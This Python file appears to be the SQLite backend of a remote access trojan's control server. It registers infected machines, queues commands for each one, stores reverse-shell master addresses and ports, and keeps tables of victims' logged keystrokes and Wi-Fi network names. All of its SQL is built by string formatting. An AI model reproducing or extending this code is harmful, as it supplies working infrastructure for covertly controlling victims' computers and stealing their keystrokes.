import sqlite3

# need to update for data created, indexes  #
def create():
    db = sqlite3.connect('main.db')
    db.execute(''' CREATE TABLE users (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    os VARCHAR(32)NOT NULL,
    registered VARCHAR(32)NOT NULL,
    last_seen VARCHAR(32)NOT NULL,
    uuid VARCHAR(32)NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE command (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    command VARCHAR(32) NOT NULL,
    uuid VARCHAR(32) NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE rshell (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    master_ip VARCHAR(32) NOT NULL,
    master_port VARCHAR(32) NOT NULL,
    uuid VARCHAR(32) NOT NULL
    ); ''')

    ### make keylog table here
    

def register(ip, username, os, registered, last_seen, uuid):
    db = sqlite3.connect('main.db')
    db.execute("INSERT INTO users VALUES('{0}', '{1}', '{2}', '{3}', '{4}', '{5}');".format(ip, username, os, registered, last_seen, uuid))
    db.commit()
    db.execute("INSERT INTO command VALUES('{0}', '{1}', '{2}', '{3}');".format(ip, username, 'ls', uuid))
    db.commit()
    db.execute("INSERT INTO rshell VALUES('{0}', '{1}', '{2}', '{3}', '{4}');".format(ip, username, '0.0.0.0', '0000', uuid))
    db.commit()

def user_command(ip, username, command, uuid):
    db = sqlite3.connect('main.db')
    db.execute("UPDATE command SET command = '{0}' WHERE user_ip='{1}' and username='{2}';".format(command ,ip, username, uuid))
    db.commit()

def rshell_master(ip, username, master_ip, uuid):
    db = sqlite3.connect('main.db')
    db.execute("UPDATE rshell SET master_ip = '{0}' WHERE user_ip='{1}' and username='{2}' and uuid='{3}';".format(master_ip, ip, username,  uuid))
    db.commit()

def update_rshell_master_port(ip, username, master_port, uuid):
    db = sqlite3.connect('main.db')
    db.execute("UPDATE rshell SET master_port='{0}' WHERE user_ip='{1}' and username='{2}' and uuid='{3}';".format(master_port, ip, username, uuid))
    db.commit()

def get_rshell_master(ip, username, uuid):
    print(ip)
    print(username)
    print(uuid)
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT master_ip FROM rshell WHERE user_ip="{0}" and username="{1}" and uuid="{2}";'.format(ip, username,  uuid))
    return cur.fetchone()[0]

def get_rshell_master_port(ip, username, uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT master_port FROM rshell WHERE user_ip="{0}" and username="{1}" and uuid="{2}";'.format(ip, username, uuid))
    return cur.fetchone()[0]


def get_user_command(ip, username, uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT command FROM command WHERE user_ip="{0}" and username="{1}"  and uuid="{2}";'.format(ip, username, uuid))

    return cur.fetchone()[0]

def check_rat_exists(ip, username, uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT * FROM command WHERE user_ip="{0}" and username="{1}" and uuid="{2}";'.format(ip, username, uuid))

    return cur.fetchone()[0]

def remove_user_command(ip, username, uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute("UPDATE command SET command = ' ' WHERE user_ip='{0}' and username='{1}' and uuid='{2}';".format(ip, username ,  uuid))
    db.commit()

def update_user_lastseendate(ip, username, uuid, last_seen):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute("UPDATE users SET last_seen = '{3}' WHERE user_ip='{0}' and username='{1}' and uuid='{2}';".format(ip, username ,  uuid, last_seen))
    db.commit()


def get_rat_list():
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username, os, registered, last_seen, uuid FROM users ;')
    return cur.fetchall()

def check_rat_existss(ip):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username FROM command WHERE user_ip="{0}";'.format(ip))
    return cur.fetchone()

def create_user_wifilisttable(uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    db.execute(''' CREATE TABLE wifidata_{0} (
    
    wifiname VARCHAR(32) NOT NULL
    ); '''.format(uuid.replace('-', '')))

def create_user_keylog_table(uuid):
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    db.execute(''' CREATE TABLE keylogger_{0} (
    
    keylog VARCHAR(32) NOT NULL
    ); '''.format(uuid.replace('-', '')))

def insert_user_wifi(uuid, wifi_name):
    db = sqlite3.connect('main.db')
    print(uuid)
    cur = db.cursor()
    db.execute("INSERT INTO wifidata_{0} VALUES('{1}');".format(uuid.replace('-', ''), wifi_name ))
    db.commit()

def insert_user_keylog(uuid, keylog):
    db = sqlite3.connect('main.db')
    print(uuid)
    cur = db.cursor()
    db.execute("INSERT INTO keylogger_{0} VALUES('{1}');".format(uuid.replace('-', ''), keylog))
    db.commit()

def get_user_wifi_names(uuid):
    print(uuid)
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT * FROM wifidata_{0} ;'.format(uuid.replace('-', '')))

    return cur.fetchall()

def get_user_keylog(uuid):
    print(uuid)
    db = sqlite3.connect('main.db')
    cur = db.cursor()
    cur.execute('SELECT * FROM keylogger_{0} ;'.format(uuid.replace('-', '')))

    return cur.fetchall()

try:
    create()
except Exception as e:
    print(e)
    pass
